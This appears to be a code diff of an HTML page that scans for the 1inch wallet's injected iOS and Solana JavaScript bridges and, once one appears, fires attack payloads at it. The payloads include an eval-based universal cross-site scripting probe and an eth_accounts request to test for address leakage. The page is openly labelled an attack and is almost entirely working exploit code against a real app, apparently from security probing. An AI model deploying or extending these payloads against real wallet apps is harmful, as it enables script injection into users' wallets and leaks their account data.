@@ -1,43 +1,53 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Bridge Persistent Scanner</title>
+</head>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>Fuzzing 1inch Bridge...</h3>
+    <h3>🔍 Scanning for 1inch Bridge...</h3>
+    <div id="status">Status: Mencari...</div>
+    <hr>
     <div id="logs"></div>
 
     <script>
-        const target = window.OneInchiOSWallet;
-        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
+        const log = (m) => {
+            const d = document.getElementById('logs');
+            d.innerHTML = `> ${m}<br>` + d.innerHTML;
+        };
 
-        if (target) {
-            log("Bridge 1inch Terdeteksi!");
-
-            // Daftar format yang sering digunakan oleh bridge dompet iOS
+        function startAttack(bridgeName) {
+            const target = window[bridgeName];
+            log(`<b style="color:yellow;">Ditemukan! Menyerang ${bridgeName}...</b>`);
+            
+            // Payload yang paling sering bocor di iOS WKWebView
             const payloads = [
-                // Format 1: String Eval (Target UXSS utama)
-                JSON.stringify({ method: "evaluateJavaScript", args: ["alert('UXSS_1')"] }),
-                
-                // Format 2: Direct Eval
-                JSON.stringify({ type: "eval", code: "alert('UXSS_2')" }),
-                
-                // Format 3: Request Accounts (Untuk cek kebocoran data alamat)
-                JSON.stringify({ method: "eth_accounts", id: 1 }),
-                
-                // Format 4: Plain string
-                "javascript:alert('UXSS_3')"
+                JSON.stringify({method: "eth_accounts", id: 1}),
+                JSON.stringify({type: "eval", code: "alert('UXSS SUCCESS')"})
             ];
 
-            payloads.forEach((p, i) => {
+            payloads.forEach(p => {
                 try {
-                    log(`Mencoba Payload #${i+1}...`);
-                    target.call(p); // Mencoba menembak bridge
+                    target.call(p); 
+                    log("Payload terkirim ke .call()");
                 } catch(e) {
-                    log(`Gagal pada #${i+1}: ${e.message}`);
+                    log("Gagal kirim: " + e.message);
                 }
             });
-        } else {
-            log("Bridge tidak ditemukan. Pastikan dibuka di DApp 1inch.");
         }
+
+        // Fungsi deteksi berulang (Interval)
+        const checkExist = setInterval(() => {
+            const bridges = ["OneInchiOSWallet", "OneInchSolanaWallet"];
+            
+            bridges.forEach(b => {
+                if (window[b]) {
+                    document.getElementById('status').innerHTML = `Status: <b style="color:yellow;">${b} AKTIF!</b>`;
+                    clearInterval(checkExist); // Hentikan scan jika sudah ketemu
+                    startAttack(b);
+                }
+            });
+        }, 500); // Cek setiap 0.5 detik
     </script>
 </body>
 </html>
